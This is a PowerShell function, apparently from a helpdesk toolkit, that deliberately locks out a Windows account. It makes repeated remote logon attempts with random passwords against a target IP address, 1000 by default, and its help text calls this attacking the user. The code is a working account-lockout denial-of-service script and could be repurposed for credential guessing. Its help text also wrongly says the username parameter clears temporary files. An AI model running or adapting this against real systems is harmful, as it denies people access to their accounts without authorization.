Function Lock-SHDUser {
    <#
    .SYNOPSIS
        Attacks target user on target IP address with windows credentials. 
    .DESCRIPTION
        Attacks target user on target IP address with windows credentials. 
    .PARAMETER IPAddress
        Target IP address
    .PARAMETER Username
        [String[]] - Target user who's temporary files will be cleared.
    .PARAMETER Count
        [int] The number of times i will attack target computer. 
    .EXAMPLE
        Lock-SHDUser -IPAddress 192.168.1.10 -Username Admin -Count 5

        Username      IPAddress     Count Password
        --------      ---------     ----- --------
        admin         192.168.4.139     1 6F.$4,(Th}^WGo5DteA"Q|{o)QdybgByWI|R(),S.7@+cSxsOPKg\.5lcA,!x
        admin         192.168.4.139     2 {7qL`sNx61tJ`4YVrSnf07`ibT*a;EdJ &Bd<2l;7o;u8heNc>hn?xD9C'SX
        admin         192.168.4.139     3 k_Yu&;zvK>qKKq,JHJB@M]_OudK>h6GbK<qSO"b1bV?gb
        admin         192.168.4.139     4 )pJ[>|^'akxfT
        admin         192.168.4.139     5 LR9BWMV{,vwkd;#\&6U>]>_jiW$&gs^/hHi/3+gNf,YlQx2/#w=M*rVNTu"2sc
    .OUTPUTS
        PS Custom Object
    .NOTES
        Author: David Bolding

    .LINK
        https://github.com/rndadhdman/PS_Super_Helpdesk
    #>
    [cmdletbinding()]
    param (
        [Parameter(ValueFromPipelineByPropertyName = $true, Mandatory = $true)][string[]]$UserName,
        [Parameter(ValueFromPipelineByPropertyName = $true, Mandatory = $true)][string]$IPAddress,
        [int]$Count = 1000
    )
    Process {
        foreach ($User in $UserName) {
            for ($i = 1; $i -le $Count; $i++) {
                $Password = [string]::Join("", (1..(Get-Random -Minimum 8 -Maximum 64) | ForEach-Object { [char](Get-Random -Minimum 32 -Maximum 126) }))  
                $Pass = ConvertTo-SecureString "$Password" -AsPlainText -Force
                Invoke-Command -ComputerName $IPAddress -ScriptBlock { Get-Process } -Credential (New-Object System.Management.Automation.PSCredential($User, $Pass)) -ErrorAction SilentlyContinue
                [pscustomobject]@{
                    Count     = $i
                    Username  = $User
                    IPAddress = $IPAddress
                    Password  = $Password
                }
            }
        }
    }
} #Review - Testing, Documentation